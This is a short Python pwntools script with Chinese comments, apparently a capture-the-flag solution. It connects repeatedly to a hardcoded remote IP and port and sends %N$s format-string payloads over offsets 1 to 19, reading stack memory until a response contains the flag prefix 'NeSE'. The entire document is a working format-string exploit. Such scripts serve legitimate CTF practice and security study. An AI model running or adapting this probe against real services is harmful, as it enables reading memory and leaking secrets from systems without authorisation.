from pwn import *
from binascii import unhexlify

def exploit():
    # 爆破偏移量
    found_flag = False
    for offset in range(1, 20):
        if found_flag:
            break
        p = remote('124.16.75.117', 51003)
        p.sendlineafter(b'> ', f'{'%s'}'.encode().replace(b'%', f'%{offset}$'.encode()))
        try:
            data = p.recvline()
            # 判断data中是否含有"NeSE"字样
            if b'NeSE' in data:
                log.success(f"找到包含NeSE的偏移: {offset}")
                log.success(f"数据内容: {data}")
                found_flag = True
            else:
                log.info(f"偏移 {offset} 的内容: {data}")
        except:
            log.warning(f"无法读取偏移 {offset}")
        finally:
            p.close()

if __name__ == '__main__':
    exploit()